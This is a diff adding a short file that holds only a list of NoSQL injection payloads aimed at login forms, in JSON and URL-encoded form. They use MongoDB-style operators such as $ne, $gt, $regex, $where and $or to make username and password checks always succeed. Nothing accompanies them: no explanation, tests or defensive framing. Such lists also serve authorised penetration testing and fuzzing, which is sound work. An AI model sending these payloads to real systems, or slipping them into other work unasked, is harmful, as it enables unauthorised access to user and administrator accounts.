@@ -1,0 +1,11 @@
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+{"username":{"$exists":true},"password":{"$exists":true}}
+{"username":"admin","password":{"$ne":null}}
+{"$where":"this.username=='admin'"}
+username[$ne]=x&password[$ne]=x
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+{"$or":[{"username":"admin"},{"password":{"$ne":null}}]}
+{"$and":[{"username":{"$ne":null}},{"password":{"$ne":null}}]}
